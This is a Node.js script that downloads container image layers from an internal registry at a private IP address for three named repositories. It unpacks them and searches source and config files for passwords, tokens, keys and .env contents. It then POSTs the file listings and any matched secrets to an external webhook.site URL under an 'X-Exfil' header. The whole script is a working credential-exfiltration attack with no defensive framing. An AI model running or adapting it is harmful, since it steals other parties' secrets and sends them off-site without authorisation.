const https = require('https');
const http = require('http');
const fs = require('fs');
const { execSync } = require('child_process');

const WEBHOOK = "https://webhook.site/1d583ea3-66e1-49a4-83f5-80ac205abf8d";
const ZOT = 'http://10.244.1.56:5000';

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label }
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    req.end();
  });
}

function httpGetBuf(url) {
  return new Promise((resolve) => {
    http.get(url, { timeout: 60000 }, (res) => {
      let d = [];
      res.on('data', c => d.push(c));
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(d) }));
    }).on('error', e => resolve({ status: 0, body: Buffer.from(e.message) }));
  });
}

async function main() {
  // Focus: cblaettl/epic-falcon/laravel - most interesting (Laravel app)
  const targets = [
    { repo: 'cblaettl/epic-falcon/laravel', tag: 'cd2bde5' },
    { repo: 'cblaettl/vouch/vouch', tag: '8532300' },
    { repo: 'zeitlos-software/loopcycles/loopcycles', tag: '3cefebd' },
  ];

  for (const t of targets) {
    const label = t.repo.replace(/\//g, '-');
    
    // Get manifest (resolve manifest list if needed)
    let mRes = await httpGetBuf(ZOT + '/v2/' + t.repo + '/manifests/' + t.tag);
    let manifest = JSON.parse(mRes.body.toString());
    if (manifest.manifests) {
      const amd = manifest.manifests.find(m => m.platform?.architecture === 'amd64') || manifest.manifests[0];
      mRes = await httpGetBuf(ZOT + '/v2/' + t.repo + '/manifests/' + amd.digest);
      manifest = JSON.parse(mRes.body.toString());
    }

    if (!manifest.layers) { await post('no-layers-' + label, 'no layers'); continue; }

    // Report layers
    await post('layers-' + label, manifest.layers.map((l,i) => i + ': ' + l.digest.substring(0,20) + '... ' + (l.size/1024/1024).toFixed(1) + 'MB').join('\n'));

    // Pull last 2 layers (app code), skip >50MB
    const appLayers = manifest.layers.slice(-2);
    for (let i = 0; i < appLayers.length; i++) {
      const layer = appLayers[i];
      if (layer.size > 50 * 1024 * 1024) {
        await post('skip-' + label + '-' + i, 'too big: ' + (layer.size/1024/1024).toFixed(1) + 'MB');
        continue;
      }

      const res = await httpGetBuf(ZOT + '/v2/' + t.repo + '/blobs/' + layer.digest);
      if (res.status !== 200) { await post('dl-err-' + label + '-' + i, 'status ' + res.status); continue; }

      const dir = '/tmp/L-' + label + '-' + i;
      const tar = dir + '.tar.gz';
      fs.writeFileSync(tar, res.body);
      fs.mkdirSync(dir, { recursive: true });

      try {
        execSync('cd ' + dir + ' && tar xzf ' + tar + ' 2>/dev/null || tar xf ' + tar + ' 2>/dev/null', { timeout: 20000 });
      } catch(e) {}

      // File listing
      let files;
      try {
        files = execSync('find ' + dir + ' -type f | head -100', { encoding: 'utf8', timeout: 5000 });
      } catch(e) { files = 'find err: ' + e.message; }
      await post('files-' + label + '-' + i, 'Layer size: ' + (res.body.length/1024/1024).toFixed(1) + 'MB\n\n' + files);

      // Search for secrets in source files
      let secrets = '';
      const fileList = files.split('\n').filter(f => f.trim());
      for (const file of fileList) {
        try {
          const stat = fs.statSync(file);
          if (stat.size > 100000) continue;
          const ext = file.split('.').pop().toLowerCase();
          const isInteresting = ['env', 'php', 'js', 'ts', 'mjs', 'json', 'yaml', 'yml', 'conf', 'sh', 'sql', 'key', 'pem'].includes(ext) ||
            file.includes('.env') || file.includes('config') || file.includes('secret') || file.includes('artisan') || file.includes('Caddyfile');
          if (!isInteresting) continue;
          
          const content = fs.readFileSync(file, 'utf8');
          if (content.match(/password|secret|key|token|api[_-]?key|database|db_|redis|smtp|mail_|auth_|credential|private|stripe|webhook|jwt/i)) {
            secrets += '\n=== ' + file.replace(dir, '') + ' ===\n' + content.substring(0, 2000) + '\n';
          }
        } catch(e) {}
      }
      if (secrets) await post('secrets-' + label + '-' + i, secrets);
    }
  }
  console.log('done');
}

main().catch(console.error);
